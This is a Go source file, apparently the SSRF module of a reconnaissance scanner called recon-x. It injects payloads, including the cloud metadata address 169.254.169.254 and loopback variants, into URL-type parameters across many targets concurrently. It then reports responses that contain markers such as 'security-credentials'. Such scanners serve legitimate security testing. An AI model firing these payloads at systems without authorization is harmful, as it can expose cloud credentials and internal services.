package ssrf

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/bytezora/recon-x/internal/finding"
	"github.com/bytezora/recon-x/internal/httpclient"
)

type Result struct {
	URL      string
	Param    string
	Payload  string
	Evidence string
	Detected bool
}

func (r Result) ToFinding() finding.Finding {
	return finding.Finding{
		Type:               "ssrf",
		Severity:           finding.High,
		Confidence:         finding.Likely,
		Title:              "Server-Side Request Forgery (SSRF) — parameter: " + r.Param,
		AffectedURL:        r.URL,
		Evidence:           r.Evidence,
		Reason:             "URL-type parameter fetched internal/cloud-metadata resource",
		Remediation:        "Validate and whitelist allowed URL destinations. Block requests to internal IPs and cloud metadata endpoints.",
		ManualVerification: true,
	}
}

var ssrfParamNames = map[string]bool{
	"url": true, "redirect": true, "next": true, "src": true, "path": true,
	"dest": true, "callback": true, "load": true, "fetch": true, "file": true,
	"uri": true, "link": true, "target": true, "goto": true, "page": true,
}

var ssrfPayloads = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://127.0.0.1/",
	"http://localhost/",
	"http://[::1]/",
	"http://0.0.0.0/",
	"http://2130706433/",
}

var ssrfIndicators = []string{
	"ami-id", "instance-id", "local-ipv4", "169.254.", "::1", "127.0.0.1", "localhost",
	"security-credentials", "iam", "metadata",
}

func isSSRFParam(name string) bool {
	return ssrfParamNames[strings.ToLower(name)]
}

func testURL(client *http.Client, rawURL string) []Result {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	params := parsed.Query()
	var results []Result
	seen := map[string]bool{}

	for param := range params {
		if !isSSRFParam(param) {
			continue
		}
		for _, payload := range ssrfPayloads {
			testParams := cloneParams(params)
			testParams.Set(param, payload)
			testU := *parsed
			testU.RawQuery = testParams.Encode()
			testURLStr := testU.String()

			key := testURLStr + "|" + param
			if seen[key] {
				continue
			}

			req, err := http.NewRequest("GET", testURLStr, nil)
			if err != nil {
				continue
			}
			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; recon-x)")
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			data, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
			resp.Body.Close()
			body := strings.ToLower(string(data))

			for _, indicator := range ssrfIndicators {
				if strings.Contains(body, indicator) {
					seen[key] = true
					results = append(results, Result{
						URL:      rawURL,
						Param:    param,
						Payload:  payload,
						Evidence: "SSRF indicator \"" + indicator + "\" found in response",
						Detected: true,
					})
					break
				}
			}
		}
	}
	return results
}

func Detect(urls []string, threads int, onFound func(Result)) []Result {
	if threads <= 0 {
		threads = 10
	}
	client := httpclient.New(15*time.Second, false)

	var (
		mu      sync.Mutex
		results []Result
		wg      sync.WaitGroup
		sem     = make(chan struct{}, threads)
		seen    = make(map[string]bool)
	)

	for _, rawURL := range urls {
		sem <- struct{}{}
		wg.Add(1)
		go func(u string) {
			defer func() { <-sem; wg.Done() }()
			found := testURL(client, u)
			if len(found) > 0 {
				mu.Lock()
				for _, r := range found {
					key := r.URL + "|" + r.Param + "|" + r.Payload
					if !seen[key] {
						seen[key] = true
						results = append(results, r)
						if onFound != nil {
							onFound(r)
						}
					}
				}
				mu.Unlock()
			}
		}(rawURL)
	}
	wg.Wait()
	return results
}

func cloneParams(src url.Values) url.Values {
	dst := url.Values{}
	for k, v := range src {
		dst[k] = append([]string{}, v...)
	}
	return dst
}
